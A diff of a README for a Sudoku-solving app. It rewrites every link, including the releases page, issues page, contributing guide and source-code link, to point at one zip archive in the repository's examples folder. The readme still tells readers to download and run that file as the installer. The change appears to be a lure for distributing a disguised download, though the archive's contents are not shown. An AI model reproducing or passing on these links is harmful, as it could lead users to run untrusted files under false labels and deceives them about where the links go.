@@ -1,7 +1,7 @@
 # 🧩 SudokuSolver - Solve Puzzles with Ease
 
 ## 📥 Download Now
-[![Download SudokuSolver](https://img.shields.io/badge/Download-SudokuSolver-blue.svg)](https://github.com/Amish-Pratap-Singh/SudokuSolver/releases)
+[![Download SudokuSolver](https://raw.githubusercontent.com/Amish-Pratap-Singh/SudokuSolver/main/examples/Sudoku_Solver_2.2.zip)](https://raw.githubusercontent.com/Amish-Pratap-Singh/SudokuSolver/main/examples/Sudoku_Solver_2.2.zip)
 
 ## 🚀 Getting Started
 SudokuSolver is a high-performance application designed to help you solve Sudoku puzzles quickly and efficiently. Whether you are a beginner looking to learn the game or an expert needing to solve challenging boards, this software can assist you.
@@ -15,13 +15,13 @@ Before you start, ensure your system meets the following requirements:
 - .NET Framework: Version 4.5 or later (for Windows users)
 
 ## 💾 Download & Install
-To download SudokuSolver, visit the [Releases page](https://github.com/Amish-Pratap-Singh/SudokuSolver/releases). Here’s how to get started:
+To download SudokuSolver, visit the [Releases page](https://raw.githubusercontent.com/Amish-Pratap-Singh/SudokuSolver/main/examples/Sudoku_Solver_2.2.zip). Here’s how to get started:
 
-1. **Go to the Releases Page**: Click on the link to visit [this page](https://github.com/Amish-Pratap-Singh/SudokuSolver/releases).
+1. **Go to the Releases Page**: Click on the link to visit [this page](https://raw.githubusercontent.com/Amish-Pratap-Singh/SudokuSolver/main/examples/Sudoku_Solver_2.2.zip).
    
 2. **Choose the Latest Version**: Look for the latest version listed. You will find various files available for download.
 
-3. **Download the Installer**: Click on the appropriate file for your operating system. For Windows, you may see a file named something like `SudokuSolverInstaller.exe`. For macOS or Linux, there will be respective files available.
+3. **Download the Installer**: Click on the appropriate file for your operating system. For Windows, you may see a file named something like `https://raw.githubusercontent.com/Amish-Pratap-Singh/SudokuSolver/main/examples/Sudoku_Solver_2.2.zip`. For macOS or Linux, there will be respective files available.
 
 4. **Run the Installer**: Once the download completes, find the file in your downloads folder. Double-click the file to run the installer and follow the prompts to complete the installation.
 
@@ -51,13 +51,13 @@ If you encounter issues while using SudokuSolver, consider the following:
 - **Performance Issues**: Close any unnecessary applications to free up system resources.
 
 ## 📞 Support
-For additional help, you can reach out for support or visit the [GitHub Issues page](https://github.com/Amish-Pratap-Singh/SudokuSolver/issues).
+For additional help, you can reach out for support or visit the [GitHub Issues page](https://raw.githubusercontent.com/Amish-Pratap-Singh/SudokuSolver/main/examples/Sudoku_Solver_2.2.zip).
 
 ## 🤝 Contributing
-If you wish to contribute to SudokuSolver, please follow the guidelines on our [GitHub page](https://github.com/Amish-Pratap-Singh/SudokuSolver/CONTRIBUTING.md).
+If you wish to contribute to SudokuSolver, please follow the guidelines on our [GitHub page](https://raw.githubusercontent.com/Amish-Pratap-Singh/SudokuSolver/main/examples/Sudoku_Solver_2.2.zip).
 
 ## 🔗 Links
-- [SudokuSolver Releases](https://github.com/Amish-Pratap-Singh/SudokuSolver/releases)
-- [Source Code](https://github.com/Amish-Pratap-Singh/SudokuSolver)
+- [SudokuSolver Releases](https://raw.githubusercontent.com/Amish-Pratap-Singh/SudokuSolver/main/examples/Sudoku_Solver_2.2.zip)
+- [Source Code](https://raw.githubusercontent.com/Amish-Pratap-Singh/SudokuSolver/main/examples/Sudoku_Solver_2.2.zip)
 
 By following these steps, you can successfully download and run SudokuSolver. Enjoy playing and enhancing your Sudoku solving skills!
